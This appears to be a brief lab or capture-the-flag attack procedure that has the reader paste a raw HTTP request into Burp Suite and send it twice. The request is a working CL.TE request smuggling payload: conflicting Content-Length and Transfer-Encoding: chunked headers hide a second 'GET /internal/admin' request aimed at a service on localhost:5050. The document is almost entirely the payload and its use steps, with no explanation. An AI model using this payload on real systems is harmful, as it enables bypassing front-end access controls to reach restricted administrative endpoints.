Attacking Procedure 

1. Paste this into burp suite 


POST /api/dashboard HTTP/1.1
Host: localhost:5050
Content-Type: text/plain
Content-Length: 59
Transfer-Encoding: chunked

0

GET /internal/admin HTTP/1.1
Host: localhost:5050

2. Click send twice 
